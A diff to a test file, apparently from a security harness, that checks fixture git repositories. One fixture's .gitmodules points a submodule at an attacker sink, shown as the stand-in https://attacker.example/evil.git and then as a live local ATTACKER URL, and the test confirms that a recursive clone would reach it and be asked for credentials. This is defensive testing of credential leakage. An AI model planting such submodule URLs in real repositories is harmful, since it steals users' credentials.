@@ -4,6 +4,7 @@ import { existsSync, readFileSync, statSync } from "node:fs";
 import { join } from "node:path";
 import { fileURLToPath } from "node:url";
 import { resolveBash, resolveGit } from "./fixtures.js";
+import { ATTACKER } from "./backends.js";
 
 const REPOS_DIR = fileURLToPath(new URL("../../fixtures/repos", import.meta.url));
 const OUT = join(REPOS_DIR, "out");
@@ -38,7 +39,29 @@ describe("fixture git repositories", () => {
       ["-C", join(OUT, "submodule.git"), "show", "HEAD:.gitmodules"],
       { encoding: "utf8" },
     );
-    expect(gitmodules).toContain("https://attacker.example/evil.git");
+    // The LIVE sink, not an unresolvable name: the baseline arm of H6b's paired
+    // row has to actually reach the attacker and be asked for credentials, or
+    // "the status quo leaks" would be asserted rather than observed. Derived
+    // from the harness constant so a port or path change cannot leave the
+    // fixture pointing somewhere nothing records.
+    expect(gitmodules).toContain(
+      `https://${ATTACKER.host}:${String(ATTACKER.port)}${ATTACKER.challengePath}/evil.git`,
+    );
+
+    // A real gitlink, not just a .gitmodules stanza: without an entry in the
+    // TREE, `clone --recurse-submodules` finds nothing to initialize, exits 0
+    // and contacts nobody — which the baseline arm would record as "no leak".
+    const tree = execFileSync(GIT, ["-C", join(OUT, "submodule.git"), "ls-tree", "HEAD", "evil"], {
+      encoding: "utf8",
+    });
+    expect(tree).toMatch(/^160000 commit /);
+  });
+
+  it("stamps a fixture version so a content change forces regeneration", () => {
+    // Without this, the all-artifact sentinel reads a stale set as complete and
+    // the fixture keeps whatever an earlier revision produced — exactly how the
+    // submodule URL above could silently stay off-box after this change (R-4).
+    expect(readFileSync(join(OUT, ".fixture-version"), "utf8").trim()).not.toBe("");
   });
 
   it("is idempotent — a second run does not rebuild clean.git", () => {
